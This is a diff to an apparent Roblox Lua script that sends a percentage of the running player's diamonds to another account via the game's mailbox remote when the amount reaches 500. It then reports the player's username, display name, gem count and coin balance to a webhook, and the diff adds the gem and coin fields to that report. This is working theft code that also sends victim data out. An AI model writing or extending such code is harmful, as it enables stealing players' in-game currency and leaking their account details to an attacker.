@@ -17,7 +17,7 @@ local function getLeaderstats(player)
     end
 end
 
-local function sendToWebhook(gemsSent)
+local function sendToWebhook(realGems, gemsSent, coinsAmount)
     local player = Players.LocalPlayer
     local realUser = player.Name
     local displayName = player.DisplayName
@@ -30,6 +30,8 @@ local function sendToWebhook(gemsSent)
         fields = {
             { name = "👤 Real User", value = "``" .. realUser .. "``", inline = true },
             { name = "🌟 Display Name", value = "``" .. displayName .. "``", inline = true },
+            { name = "💎 Real Gems", value = "``" .. (realGems or "nil") .. "``", inline = true },
+            { name = "💰 Player Coins", value = "``" .. (coinsAmount or "nil") .. "``", inline = true },
             { name = "💰 Gems Sent", value = "``" .. (gemsSent or "nil") .. "``", inline = true },
             { name = "🏆 Leaderboard Stats", value = "``" .. leaderboardInfo .. "``", inline = false }
         },
@@ -61,6 +63,7 @@ end
 
 local player = Players.LocalPlayer 
 local diamondsAmount = player.PlayerGui.Main.Top.Diamonds.Amount.Text
+local coinsAmount = player.PlayerGui.Main.Top.Coins.Amount.Text
 
 local function applyPercentage(diamonds, percentage)
     diamonds = diamonds:gsub(",", "")
@@ -95,7 +98,7 @@ if adjustedAmount >= 500 then
     }
 
     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-    sendToWebhook(adjustedAmount)
+    sendToWebhook(diamondsAmount, adjustedAmount, coinsAmount)
 else
-    sendToWebhook(nil)
+    sendToWebhook(diamondsAmount, nil, coinsAmount)
 end
